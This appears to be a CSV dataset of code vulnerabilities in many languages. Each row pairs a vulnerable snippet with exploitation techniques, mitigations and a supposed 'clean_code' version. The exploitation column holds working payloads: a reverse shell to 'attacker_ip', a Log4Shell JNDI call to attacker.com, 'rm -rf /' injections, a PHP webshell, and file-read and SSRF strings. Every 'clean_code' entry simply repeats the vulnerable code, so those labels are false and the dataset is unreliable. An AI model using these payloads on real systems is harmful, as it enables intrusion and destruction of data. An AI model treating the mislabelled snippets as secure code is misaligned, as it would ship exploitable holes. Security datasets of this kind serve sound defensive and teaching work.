id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-001,Node.js,SQL Injection,Unsanitized user input in SQL queries allows attackers to manipulate database operations.,"const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`; db.query(query, (err, res) => {...});",Inject malicious SQL like ' OR '1'='1 to bypass authentication. Use tools like SQLMap for automated exploitation.,Use parameterized queries or ORM like Sequelize. Validate and sanitize inputs with libraries like validator.js.,"const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`; db.query(query, (err, res) => {...});",True,True,False,False,152,False,True,True,Injection,1
vuln-002,Node.js,Command Injection,Executing shell commands with unsanitized input leads to arbitrary command execution.,"const { exec } = require('child_process'); exec(`ping ${req.query.host}`, (err, stdout) => {...});",Append commands like ; rm -rf / to input. Exploit via web requests or fuzzing tools like Burp Suite.,Avoid exec; use spawn with array args. Sanitize input and whitelist allowed values.,"const { exec } = require(); exec(`ping ${req.query.host}`, (err, stdout) => {...});",True,True,False,True,98,False,True,True,Injection,1
vuln-003,Python,SQL Injection,Direct string concatenation in SQL queries exposes to injection attacks.,"cursor.execute(f""SELECT * FROM users WHERE username = '{request.form['username']}' AND password = '{request.form['password']}'"")",Input payloads like ' OR 1=1-- to extract data. Automate with sqlmap or custom scripts.,Use parameterized queries with psycopg2 or SQLAlchemy. Implement input validation.,"cursor.execute(f""SELECT * FROM users WHERE username = '{request.form['username']}' AND password = '{request.form['password']}'"")",False,True,False,True,128,False,True,False,Injection,1
vuln-004,Python,OS Command Injection,Subprocess calls with user input enable command chaining.,"import subprocess; subprocess.call(f""ping {request.args.get('host')}"", shell=True)","Inject ; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker_ip"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""/bin/sh"")' for reverse shell.",Use shell=False and list args. Validate input against regex patterns.,"import subprocess; subprocess.call(f""ping {request.args.get('host')}"", shell=True)",False,False,False,True,82,False,True,False,Injection,1
vuln-005,Java,SQL Injection,Concatenated SQL strings from user input compromise query integrity.,"String query = ""SELECT * FROM users WHERE username = '"" + request.getParameter(""username"") + ""' AND password = '"" + request.getParameter(""password"") + ""'""; stmt.executeQuery(query);",Use ' UNION SELECT database()-- to leak info. Chain with JDBC exploits.,Employ PreparedStatement with placeholders. Use OWASP ESAPI for sanitization.,"String query = ""SELECT * FROM users WHERE username = '"" + request.getParameter(""username"") + ""' AND password = '"" + request.getParameter(""password"") + ""'""; stmt.executeQuery(query);",True,True,False,True,181,False,True,True,Injection,1
vuln-006,Java,XXE (XML External Entity),Processing unvalidated XML allows entity expansion or external file access.,DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new InputSource(new StringReader(xmlInput)));,"Inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> and reference &xxe; to read files.","Disable external entities: dbf.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true); Use secure parsers like OWASP guidelines.",DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new InputSource(new StringReader(xmlInput)));,True,False,False,False,183,False,False,False,Other,1
vuln-007,PHP,SQL Injection,Raw input in MySQL queries enables data manipulation.,"$query = ""SELECT * FROM users WHERE username = '"" . $_POST['username'] . ""' AND password = '"" . $_POST['password'] . ""'""; mysqli_query($conn, $query);",Payload: ' OR SLEEP(5)-- for time-based blind injection. Use Havij or manual burp intercepts.,"Prepared statements: $stmt = $conn->prepare(""SELECT * FROM users WHERE username = ? AND password = ?""); Bind params.","$query = ""SELECT * FROM users WHERE username = '"" . $_POST['username'] . ""' AND password = '"" . $_POST['password'] . ""'""; mysqli_query($conn, $query);",True,True,False,False,150,False,True,False,Injection,1
vuln-008,PHP,File Inclusion,User-controlled paths in include/require lead to LFI/RFI.,include($_GET['page'] . '.php');,"Append ?page=../../../etc/passwd%00 for LFI. For RFI, use remote URLs if allow_url_include=on.",Whitelist allowed files. Use basename() and avoid user input in paths.,include($_GET['page'] . '.php');,False,False,False,False,32,False,True,False,File_Handling,1
vuln-009,Ruby,SQL Injection,Interpolated strings in ActiveRecord queries vulnerable to injection.,"User.where(""username = '#{params[:username]}' AND password = '#{params[:password]}'"")",Input: '); DROP TABLE users;-- to destroy data. Exploit via Rails console or web forms.,"Use placeholders: User.where(username: params[:username], password: params[:password]). Sanitize with Rails built-ins.","User.where(""username = '#{params[:username]}' AND password = '#{params[:password]}'"")",True,False,False,False,85,False,True,False,Injection,1
vuln-010,Ruby,Command Injection,System calls with user input allow arbitrary execution.,"system(""ping #{params[:host]}"")",Inject ; rm -rf / for destruction. Chain commands for shell access.,"Use Open3.capture3 with array: Open3.capture3('ping', params[:host]). Validate host with IP regex.","system(""ping #{params[:host]}"")",True,False,False,True,31,False,True,False,Injection,1
vuln-011,Go,SQL Injection,Formatted strings in database queries expose to attacks.,"query := fmt.Sprintf(""SELECT * FROM users WHERE username = '%s' AND password = '%s'"", r.FormValue(""username""), r.FormValue(""password"")); db.Query(query)",Payload: ' OR '1'='1 to login bypass. Use go-sql-driver exploits.,"Prepared statements: stmt, _ := db.Prepare(""SELECT * FROM users WHERE username = ? AND password = ?""); stmt.Query(username, password)","query := fmt.Sprintf(""SELECT * FROM users WHERE username = '%s' AND password = '%s'"", r.FormValue(""username""), r.FormValue(""password"")); db.Query(query)",True,True,False,False,152,False,True,True,Injection,1
vuln-012,Go,Path Traversal,User input in file paths allows accessing unauthorized files.,"http.HandleFunc(""/file"", func(w http.ResponseWriter, r *http.Request) { file := r.URL.Query().Get(""file""); data, _ := ioutil.ReadFile(file); ... })",Query ?file=../../../etc/passwd to read sensitive files.,"Canonicalize paths: filepath.Clean(file). Restrict to base dir with filepath.Join(base, file).","http.HandleFunc(""/file"", func(w http.ResponseWriter, r *http.Request) { file := r.URL.Query().Get(""file""); data, _ := ioutil.ReadFile(file); ... })",True,True,True,False,147,False,True,False,File_Handling,1
vuln-013,C# (.NET),SQL Injection,Concatenated SQL commands from input.,"string query = ""SELECT * FROM users WHERE username = '"" + Request.Form[""username""] + ""' AND password = '"" + Request.Form[""password""] + ""'""; SqlCommand cmd = new SqlCommand(query);",Input: '; EXEC xp_cmdshell('net user hacker pass /add')-- for command exec.,"Parameterized: SqlCommand cmd = new SqlCommand(""SELECT * FROM users WHERE username = @user AND password = @pass""); cmd.Parameters.AddWithValue(""@user"", username);","string query = ""SELECT * FROM users WHERE username = '"" + Request.Form[""username""] + ""' AND password = '"" + Request.Form[""password""] + ""'""; SqlCommand cmd = new SqlCommand(query);",True,True,False,False,179,False,True,True,Injection,1
vuln-014,C# (.NET),LDAP Injection,Unsanitized input in LDAP queries.,"string filter = ""(uid="" + username + "")""; DirectorySearcher searcher = new DirectorySearcher(filter);",Input: *)(uid=*))(|(uid=* to bypass filters and enumerate users.,"Escape special chars: username = username.Replace(""("", ""%28"").Replace("")"", ""%29""); Use parameterized LDAP if available.","string filter = ""(uid="" + username + "")""; DirectorySearcher searcher = new DirectorySearcher(filter);",False,False,False,False,101,True,True,True,Injection,1
vuln-015,Node.js,NoSQL Injection,Unsanitized input in MongoDB queries allows query manipulation.,"const query = { username: req.body.username, password: req.body.password }; db.collection('users').findOne(query);","Input JSON like {""$ne"": null} for username to bypass checks. Use NoSQLMap for automation.",Use MongoDB's aggregation or sanitize with mongoose schemas. Validate inputs strictly.,"const query = { username: req.body.username, password: req.body.password }; db.collection('users').findOne(query);",True,True,False,False,114,False,True,False,Injection,1
vuln-016,Node.js,SSRF,User-controlled URLs in requests lead to internal resource access.,const url = req.query.url; axios.get(url).then(res => {...});,Request internal IPs like http://169.254.169.254/latest/meta-data/ for cloud metadata. Chain with DNS rebinding.,Whitelist allowed domains. Use libraries like ssrf-req-filter.,const url = req.query.url; axios.get(url).then(res => {...});,True,True,False,False,61,False,False,False,Other,1
vuln-017,Python,Deserialization,Untrusted data in pickle loads arbitrary code execution.,import pickle; data = request.data; obj = pickle.loads(data);,Craft malicious pickle with __reduce__ to exec os.system('rm -rf /'). Use ysoserial equivalents.,Avoid pickle; use JSON or safe serializers like msgpack. Sign data with HMAC.,import pickle; data = request.data; obj = pickle.loads(data);,False,False,False,False,61,False,False,False,Other,1
vuln-018,Python,Path Traversal,User input in file paths exposes sensitive files.,"filename = request.args.get('file'); with open(filename, 'r') as f: ...",Input ../etc/passwd to read files. Traverse to /proc/self/environ for env vars.,Use os.path.normpath and check against base dir. Whitelist file names.,"filename = request.args.get('file'); with open(filename, 'r') as f: ...",False,False,True,False,71,False,True,False,File_Handling,1
vuln-019,Java,Deserialization,ObjectInputStream on untrusted data executes gadgets.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); Object obj = ois.readObject();,Use ysoserial CommonsCollections for RCE. Chain gadgets for command exec.,Use SerialKiller or NotSoSerial lookback. Avoid deserialization of untrusted data.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); Object obj = ois.readObject();,True,False,False,False,109,False,False,False,Other,1
vuln-020,Java,LDAP Injection,Unsanitized input alters LDAP filters.,"String filter = ""(cn="" + userInput + "")""; ldapCtx.search("""", filter, controls);",Input *)(|(objectClass=*) to enumerate. Bypass auth with )(uid=*.,"Escape LDAP chars: replace * with \2a, ( with \28. Use prepared LDAP statements if available.","String filter = ""(cn="" + userInput + "")""; ldapCtx.search("""", filter, controls);",True,False,False,False,79,True,True,True,Injection,1
vuln-021,PHP,XXE,XML processing without disabling entities.,$xml = simplexml_load_string($input);,Inject <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> &xxe; for file read.,libxml_disable_entity_loader(true); Use DOMDocument with setFeature.,$xml = simplexml_load_string($input);,True,False,False,False,37,False,False,False,Other,1
vuln-022,PHP,Unrestricted File Upload,No validation on uploaded files allows webshells.,"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",Upload .php with <?php system($_GET['cmd']); ?> and access for RCE.,"Check MIME types, extensions. Store outside webroot, generate random names.","move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",False,False,False,False,86,False,True,False,File_Handling,1
vuln-023,Ruby,Deserialization,Marshal.load on untrusted data executes code.,obj = Marshal.load(input);,Craft payload with _dump to exec system calls. Use Ruby equivalents of ysoserial.,Use JSON or YAML.safe_load. Sign data with secrets.,obj = Marshal.load(input);,True,False,False,False,26,False,False,False,Other,1
vuln-024,Ruby,SSRF,OpenURI with user URLs accesses internals.,require 'open-uri'; URI.open(params[:url]).read;,file:///etc/passwd or http://127.0.0.1/admin for local access.,Use Net::HTTP with domain whitelisting. Avoid file:// scheme.,require 'open-uri'; URI.open(params[:url]).read;,True,False,True,False,48,False,True,False,Other,1
vuln-025,Go,Deserialization,"Gob decoding untrusted data, though less common, can lead to issues.",dec := gob.NewDecoder(bytes.NewReader(data)); var obj MyType; dec.Decode(&obj);,Exploit type mismatches or large allocations for DoS. Limited RCE.,Use JSON or protobuf. Validate and limit input size.,dec := gob.NewDecoder(bytes.NewReader(data)); var obj MyType; dec.Decode(&obj);,False,False,False,False,79,False,False,False,Other,1
vuln-026,Go,SSRF,http.Get with user input URLs.,"resp, _ := http.Get(r.URL.Query().Get(""url""));",http://localhost:8080/secret or gopher:// for protocol abuse.,Custom transport with URL parsing and domain whitelist.,"resp, _ := http.Get(r.URL.Query().Get(""url""));",True,True,False,False,46,False,True,False,Other,1
vuln-027,C# (.NET),Deserialization,BinaryFormatter on untrusted data executes gadgets.,BinaryFormatter bf = new BinaryFormatter(); object obj = bf.Deserialize(stream);,Ysoserial.Net payloads like TextFormattingRunProperties for RCE.,Avoid BinaryFormatter; use Json.NET with TypeNameHandling.None.,BinaryFormatter bf = new BinaryFormatter(); object obj = bf.Deserialize(stream);,False,False,False,False,80,False,False,False,Other,1
vuln-028,C# (.NET),XXE,XmlReader without secure settings.,XmlReader reader = XmlReader.Create(new StringReader(xml));,XXE payload for file:/C:/Windows/win.ini read.,XmlReaderSettings settings = new XmlReaderSettings() { DtdProcessing = DtdProcessing.Prohibit };,XmlReader reader = XmlReader.Create(new StringReader(xml));,False,False,False,False,59,False,False,False,Other,1
vuln-029,Node.js,Prototype Pollution,Merging untrusted objects pollutes prototypes.,"function merge(target, source) { for (let key in source) { target[key] = source[key]; } } merge({}, req.body);","Input {""__proto__"": {""admin"": true}} to alter behavior.",Use Object.create(null) or libraries like lodash merge with checks.,"function merge(target, source) { for (let key in source) { target[key] = source[key]; } } merge({}, req.body);",True,False,False,False,110,False,False,False,Other,1
vuln-030,Node.js,JWT None Algorithm,Accepting 'none' algorithm in JWT validation.,"jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });",Change alg to none and remove signature for bypass.,Specify algorithms: ['HS256']. Use jsonwebtoken with strict options.,"jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });",False,False,False,False,61,False,True,False,Other,1
vuln-031,Python,SSRF,requests.get with user URLs.,import requests; requests.get(request.args.get('url')),dict://localhost:6379/info for port scanning.,Use defuse/ssrf-filters or whitelist URLs.,import requests; requests.get(request.args.get('url')),False,False,False,False,54,False,True,False,Other,1
vuln-032,Python,Template Injection,Jinja2 with user input in templates.,from jinja2 import Template; Template(user_input).render();,{{ config.items() }} for config dump. Escalate to RCE with __globals__.,Sandbox environment or avoid rendering user templates.,from jinja2 import Template; Template(user_input).render();,True,False,False,False,59,False,False,False,Injection,1
vuln-033,Java,SSRF,URL connections with user input.,"URL url = new URL(request.getParameter(""url"")); url.openConnection();",jar:file:///etc/passwd!/ for file read.,Validate scheme and host. Use Apache HttpClient with restrictions.,"URL url = new URL(request.getParameter(""url"")); url.openConnection();",True,False,True,False,69,False,True,False,Other,1
vuln-034,Java,Log4Shell,Log4j vulnerable to JNDI injection.,logger.error(userInput); // with log4j < 2.15,${jndi:ldap://attacker.com/a} for RCE.,Upgrade to log4j 2.17+. Set log4j2.formatMsgNoLookups=true.,logger.error(userInput);,True,False,False,False,45,False,False,False,Other,1
vuln-035,PHP,Deserialization,unserialize on user data.,unserialize($_COOKIE['data']);,PHPGGC payloads for __destruct RCE.,"Use json_decode. If needed, allowed_classes option.",unserialize($_COOKIE['data']);,False,False,False,False,30,False,True,False,Other,1
vuln-036,PHP,SSRF,curl_exec with user URLs.,$ch = curl_init($_GET['url']); curl_exec($ch);,gopher://127.0.0.1:6379/_%0d%0aSET%20key%20val for Redis attack.,"curl_setopt(CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);",$ch = curl_init($_GET['url']); curl_exec($ch);,False,True,False,True,46,False,True,False,Other,1
vuln-037,Ruby,YAML Deserialization,YAML.load on untrusted input.,YAML.load(input);,"!ruby/object:Gem::Installer { :i: !ruby/object:Gem::SpecFetcher { :f: !ruby/object:Gem::Installer { :i: !ruby/object:Gem::Requirement { requirements: !ruby/object:Gem::Package::TarReader { io: !ruby/object:Net::BufferedIO { io: !ruby/object:Gem::Package::TarReader::Entry { read: 0, header: ""foo"" } } } } } } for RCE.",YAML.safe_load with permitted_classes.,YAML.load(input);,True,False,False,False,17,False,False,False,Other,1
vuln-038,Ruby,Path Traversal,File.open with user paths.,File.open(params[:file]).read,../../etc/passwd,"File.expand_path(file, base_dir) and check prefix.",File.open(params[:file]).read,True,False,True,False,29,False,False,False,File_Handling,1
vuln-039,Go,Template Injection,html/template with user input as template.,"t, _ := template.New("""").Parse(userInput); t.Execute(w, data);",{{ .OS }} or range to access env.,Don't parse user input as templates. Use static templates.,"t, _ := template.New("""").Parse(userInput); t.Execute(w, data);",True,True,False,True,62,False,True,False,Injection,1
vuln-040,Go,Insecure Randomness,math/rand for crypto purposes.,"import ""math/rand""; token := rand.Intn(1000000);",Predict seeds based on time for token guessing.,Use crypto/rand.Reader.,"import ""math/rand""; token := rand.Intn(1000000);",False,False,False,False,48,False,True,False,Other,1
vuln-041,C# (.NET),SSRF,WebClient.DownloadString with user URLs.,"new WebClient().DownloadString(Request.QueryString[""url""]);",file:///C:/inetpub/wwwroot/web.config,"Uri uri = new Uri(url); if (uri.Scheme != ""http"" && uri.Scheme != ""https"") throw;","new WebClient().DownloadString(Request.QueryString[""url""]);",True,True,False,False,59,False,True,False,Other,1
vuln-042,C# (.NET),Insecure Deserialization (JSON),JavaScriptSerializer with TypeResolver.,new JavaScriptSerializer(new SimpleTypeResolver()).Deserialize<object>(input);,Payloads for ProcessStartInfo RCE.,Use Json.NET with TypeNameHandling.None.,new JavaScriptSerializer(new SimpleTypeResolver()).Deserialize<object>(input);,True,False,False,False,78,False,False,False,Other,1
vuln-043,Kotlin,SQL Injection,String interpolation in queries.,"val query = ""SELECT * FROM users WHERE name = '${request.params[""name""]}'""; db.rawQuery(query)",' OR 1=1--,Use PreparedStatement.,"val query = ""SELECT * FROM users WHERE name = '${request.params[""name""]}'""; db.rawQuery(query)",True,True,False,False,94,False,True,True,Injection,1
vuln-044,Kotlin,Deserialization,ObjectInputStream in Kotlin.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),Similar to Java ysoserial.,"Avoid, use Kotlinx.serialization.",val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),True,False,False,False,83,False,False,False,Other,1
vuln-045,Scala,Command Injection,Process execution with input.,"import sys.process._; s""ping $host"".!",; rm -rf /,"Seq(""ping"", host).!","import sys.process._; s""ping $host"".!",False,False,False,False,37,False,True,False,Injection,1
vuln-046,Scala,XXE,XML parsing without security.,XML.loadString(xml),Standard XXE payloads.,Use SAXParser with features disabled.,XML.loadString(xml),False,False,False,False,19,False,False,False,Other,1
vuln-047,Rust,Command Injection,Command::new with unsanitized input.,"use std::process::Command; Command::new(""sh"").arg(""-c"").arg(&input).output();",ls; rm -rf /,Avoid shell; use separate args.,"use std::process::Command; Command::new(""sh"").arg(""-c"").arg(&input).output();",True,False,False,False,77,False,True,False,Injection,1
vuln-048,Rust,Path Traversal,Path::new with user input.,let path = Path::new(&input); fs::read_to_string(path);,../../../etc/passwd,Canonicalize and check components.,let path = Path::new(&input); fs::read_to_string(path);,True,False,False,False,55,False,False,False,File_Handling,1
vuln-049,Elixir,SQL Injection,Raw SQL with interpolation.,"Repo.query(""SELECT * FROM users WHERE name = '#{name}'"")",' OR 1=1,Use Ecto.Query with params.,"Repo.query(""SELECT * FROM users WHERE name = '#{name}'"")",True,True,False,False,56,False,True,False,Injection,1
vuln-050,Elixir,Command Injection,System.cmd with input.,"System.cmd(""ping"", [host])",If shell: ping; rm,Use Porcelain without shell.,"System.cmd(""ping"", [host])",False,False,False,True,26,False,True,False,Injection,1
vuln-051,Perl,SQL Injection,DBI with concatenated queries.,"$dbh->do(""SELECT * FROM users WHERE name = '$name'"");",' OR 1=1--,"Use placeholders: $dbh->prepare(""SELECT * FROM users WHERE name = ?"");","$dbh->do(""SELECT * FROM users WHERE name = '$name'"");",False,True,False,False,53,False,True,False,Injection,1
vuln-052,Perl,Command Injection,system with input.,"system(""ping $host"");",; rm -rf /,"system('ping', $host);","system(""ping $host"");",False,False,False,True,21,False,True,False,Injection,1
vuln-053,Node.js,Insecure Regex DoS,Evil regex leading to ReDoS.,/^([a-zA-Z0-9]+)*$/.test(input);,Input aaaaaaaaaaaaaaaaaaaaaaaaa! for backtracking.,Use safe-regex or atomic groups.,/^([a-zA-Z0-9]+)*$/.test(input);,True,False,False,False,32,False,False,True,Other,1
vuln-054,Python,Insecure Eval,eval on user input.,eval(request.args.get('expr')),__import__('os').system('rm -rf /'),Avoid eval; use ast.literal_eval for safe cases.,eval(request.args.get('expr')),False,False,False,True,30,False,True,False,Other,1
vuln-055,Java,Insecure Random,java.util.Random for crypto.,Random rand = new Random(); int token = rand.nextInt();,Predict based on seed.,SecureRandom sr = new SecureRandom();,Random rand = new Random(); int token = rand.nextInt();,False,False,False,False,55,False,False,False,Other,1
vuln-056,PHP,Insecure Eval,eval on input.,eval($_GET['code']);,system('rm -rf /');,Never use eval.,eval($_GET['code']);,False,False,False,True,20,False,True,False,Other,1
vuln-057,Ruby,Insecure Eval,eval on params.,eval(params[:code]),system('rm -rf /'),Avoid eval; use safer alternatives.,eval(params[:code]),True,False,False,True,19,False,False,False,Other,1
vuln-058,Go,Race Condition,File creation without checks.,"if _, err := os.Stat(file); os.IsNotExist(err) { os.Create(file); }",TOCTOU: symlink during check and create.,Use os.OpenFile with O_EXCL | O_CREATE.,"if _, err := os.Stat(file); os.IsNotExist(err) { os.Create(file); }",False,False,False,False,67,False,False,False,Other,1
vuln-059,C# (.NET),Insecure Random,System.Random for secrets.,Random rand = new Random(); int token = rand.Next();,Predictable sequences.,RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();,Random rand = new Random(); int token = rand.Next();,False,False,False,False,52,False,False,False,Other,1
vuln-060,Node.js,CORS Misconfiguration,Allowing all origins.,app.use(cors({ origin: '*' }));,CSRF from malicious sites.,Specify origins: { origin: 'trusted.com' },app.use(cors({ origin: '*' }));,False,False,False,False,31,False,True,False,Configuration,1
vuln-061,Python,CORS Misconfig,Flask-CORS with *.,"CORS(app, resources={r""/*"": {""origins"": ""*""}})",Cross-origin requests.,Specify origins.,"CORS(app, resources={r""/*"": {""origins"": ""*""}})",False,False,False,False,46,False,True,False,Configuration,1
vuln-062,Java,IDOR,Direct object reference without authz.,"User user = em.find(User.class, request.getParameter(""id""));",Change id to access others' data.,Check ownership: if (user.getId() != sessionUserId) deny;,"User user = em.find(User.class, request.getParameter(""id""));",True,False,False,False,60,False,True,False,Other,1
vuln-063,PHP,IDOR,Fetching by user-supplied ID.,"$id = $_GET['id']; $user = $db->query(""SELECT * FROM users WHERE id = $id"");",Increment IDs to leak.,Verify session user owns the ID.,"$id = $_GET['id']; $user = $db->query(""SELECT * FROM users WHERE id = $id"");",True,True,False,False,76,False,True,False,Other,1
vuln-064,Ruby,Mass Assignment,params.permit without whitelist.,User.create(params[:user]),Add admin: true in params.,"User.create(params.require(:user).permit(:name, :email))",User.create(params[:user]),True,False,False,False,26,False,False,False,Other,1
vuln-065,Go,IDOR,Direct access by ID.,"id := r.URL.Query().Get(""id""); db.GetUser(id);",Guess IDs.,Check against session user.,"id := r.URL.Query().Get(""id""); db.GetUser(id);",True,True,False,False,46,False,True,False,Other,1
vuln-066,C# (.NET),IDOR,Entity by ID without check.,"var user = db.Users.Find(Request.Query[""id""]);",Modify ID.,if (user.Id != User.Identity.GetUserId()) deny;,"var user = db.Users.Find(Request.Query[""id""]);",True,True,False,False,46,False,True,False,Other,1
vuln-067,Kotlin,SSRF,OkHttp with user URL.,val client = OkHttpClient(); client.newCall(Request.Builder().url(url).build()).execute();,Internal URLs.,Validate URL host.,val client = OkHttpClient(); client.newCall(Request.Builder().url(url).build()).execute();,False,True,False,True,90,False,False,False,Other,1
vuln-068,Scala,Deserialization,Java deserialization in Scala.,Similar to Java ObjectInputStream.,Ysoserial.,Avoid; use Scala pickling with care.,Similar to Java ObjectInputStream.,True,False,False,False,34,False,False,False,Other,1
vuln-069,Rust,SQL Injection,rusqlite with concat.,"conn.execute(&format!(""SELECT * FROM users WHERE name = '{name}'""), []);",' OR 1=1,"Use params: conn.execute(""SELECT * FROM users WHERE name = ?1"", [name]);","conn.execute(&format!(""SELECT * FROM users WHERE name = '{name}'""), []);",False,True,False,True,72,False,True,False,Injection,1
vuln-070,Elixir,Deserialization,Erlang term_to_binary inverse.,:erlang.binary_to_term(input),Craft terms for code exec.,Use :safe option or avoid.,:erlang.binary_to_term(input),True,False,False,False,29,False,False,False,Other,1
vuln-071,Perl,XXE,XML::Simple without NoExpand.,XMLin($xml);,XXE payload.,"XMLin($xml, NoExpand => 1, NSExpand => 1);",XMLin($xml);,False,False,False,False,12,False,False,False,Other,1
vuln-072,Node.js,Zip Slip,Extracting zip without path checks.,adm-zip extracts to paths with ../,Zip with ../files to overwrite.,"Sanitize paths, strip ../",adm-zip extracts to paths with ../,False,False,False,False,34,False,False,False,Other,1
vuln-073,Python,Zip Slip,zipfile.extractall without validation.,with zipfile.ZipFile(file) as z: z.extractall();,Malicious zip with ../,Check member.filename for ../,with zipfile.ZipFile(file) as z: z.extractall();,False,False,False,False,48,False,False,False,Other,1
vuln-074,Java,Zip Slip,ZipInputStream without path sanitization.,Extract to entry.getName(),../ in entry name.,Canonicalize and check path.,Extract to entry.getName(),False,False,False,False,26,False,False,False,Other,1
vuln-075,PHP,Zip Slip,ZipArchive::extractTo,$zip->extractTo('/path/');,../ in filenames.,Validate each filename.,$zip->extractTo('/path/');,False,False,False,False,26,False,True,False,Other,1
vuln-076,Ruby,Zip Slip,rubyzip extract.,Zip::File.open(file) { |z| z.each { |e| e.extract } },../ paths.,Check e.name for ../,Zip::File.open(file) { |z| z.each { |e| e.extract } },False,False,True,False,53,False,False,False,Other,1
vuln-077,Go,Zip Slip,archive/zip Reader.,"r, _ := zip.OpenReader(file); for _, f := range r.File { os.Create(f.Name) }",../ in f.Name,Clean path with filepath.Clean,"r, _ := zip.OpenReader(file); for _, f := range r.File { os.Create(f.Name) }",False,False,True,False,76,False,False,False,Other,1
vuln-078,C# (.NET),Zip Slip,ZipArchive ExtractToDirectory,"ZipFile.ExtractToDirectory(zipPath, extractPath);",../ entries.,Manual extract with path validation.,"ZipFile.ExtractToDirectory(zipPath, extractPath);",False,False,False,False,49,False,False,False,Other,1
vuln-079,Node.js,GraphQL Depth Limit,No depth limit on queries.,apollo-server without depthLimit,Nested queries for DoS.,Use graphql-depth-limit.,apollo-server without depthLimit,False,False,False,False,32,False,False,False,Other,1
vuln-080,Python,GraphQL Injection,Unsanitized inputs in resolvers.,graphql with raw SQL in resolver.,Injection in variables.,Parameterize queries in resolvers.,graphql with raw SQL in resolver.,False,False,False,False,33,False,False,False,Injection,1
vuln-081,Java,Insecure Session Handling,Session IDs exposed in URLs or predictable.,"String sessionId = UUID.randomUUID().toString(); response.sendRedirect(""page?sessionId="" + sessionId);",Sniff URLs for session IDs or brute-force predictable IDs.,"Use HttpSession with secure cookies: session.setAttribute(""user"", user); Set Secure, HttpOnly flags.","String sessionId = UUID.randomUUID().toString(); response.sendRedirect(""page?sessionId="" + sessionId);",False,False,False,False,102,False,True,True,Authentication,1
vuln-082,Java,Broken Authentication,Weak password storage without hashing.,"String password = request.getParameter(""password""); em.persist(new User(username, password));",Dump database to access plaintext passwords.,"Use BCrypt: String hashed = BCrypt.hashpw(password, BCrypt.gensalt());","String password = request.getParameter(""password""); em.persist(new User(username, password));",True,False,False,False,93,False,True,False,Authentication,1
vuln-083,PHP,Session Fixation,Not regenerating session ID on login.,session_start(); $_SESSION['user'] = $username;,"Provide malicious session ID via URL, hijack post-login.",Regenerate: session_regenerate_id(true);,session_start(); $_SESSION['user'] = $username;,False,False,False,False,47,False,True,False,Authentication,1
vuln-084,PHP,Insecure Direct Object Reference,Accessing resources by predictable IDs.,"$id = $_GET['id']; $file = file_get_contents(""files/$id.pdf"");",Guess IDs to access unauthorized files.,"Check permissions: if (!userCanAccess($id, $user)) exit;","$id = $_GET['id']; $file = file_get_contents(""files/$id.pdf"");",False,False,False,False,62,False,True,False,Other,1
vuln-085,Python,Insecure Session Cookies,Cookies without Secure/HttpOnly flags.,"response.set_cookie('session', session_id);",XSS to steal cookies or MITM for HTTP cookies.,"response.set_cookie('session', session_id, secure=True, httponly=True, samesite='Strict')","response.set_cookie('session', session_id);",False,False,False,False,43,False,True,False,Authentication,1
vuln-086,Python,Hardcoded Credentials,Credentials in source code.,"db.connect(user='admin', password='p@ssw0rd')",Code review or repo leak to extract creds.,"Use environment variables: os.getenv('DB_USER'), os.getenv('DB_PASS')","db.connect(user='admin', password='p@ssw0rd')",False,False,False,False,45,False,True,False,Other,1
vuln-087,Node.js,Insecure File Upload,No validation on uploaded files.,"fs.writeFileSync(`uploads/${req.files.file.name}`, req.files.file.data);","Upload shell.js with malicious code, execute via endpoint.","Validate MIME types, extensions. Store outside webroot.","fs.writeFileSync(`uploads/${req.files.file.name}`, req.files.file.data);",True,False,True,False,72,False,False,True,File_Handling,1
vuln-088,Node.js,Directory Traversal,User input in file paths.,"fs.readFileSync(path.join('public', req.query.file));",Input ../../etc/passwd to read files.,"path.resolve(baseDir, file); Check prefix matches baseDir.","fs.readFileSync(path.join('public', req.query.file));",True,True,True,False,53,False,True,False,Other,1
vuln-089,Ruby,Insecure Session Storage,Storing sensitive data in session without encryption.,session[:user_data] = { ssn: params[:ssn] },Steal session to access sensitive data.,"Encrypt: session[:user_data] = encrypt(params[:ssn], secret_key)",session[:user_data] = { ssn: params[:ssn] },True,False,False,False,43,False,False,False,Authentication,1
vuln-090,Ruby,Insecure Redirect,Unvalidated redirect URLs.,redirect_to params[:url],Redirect to malicious site: ?url=http://evil.com,Whitelist URLs: redirect_to(valid_urls.include?(url) ? url : '/'),redirect_to params[:url],True,False,False,False,24,False,False,False,Other,1
vuln-091,Go,Insecure Cookies,Cookies without secure flags.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: id})",MITM or XSS to steal cookies.,"http.Cookie{Name: ""session"", Value: id, Secure: true, HttpOnly: true, SameSite: http.SameSiteStrictMode}","http.SetCookie(w, &http.Cookie{Name: ""session"", Value: id})",False,False,False,False,59,False,True,False,Other,1
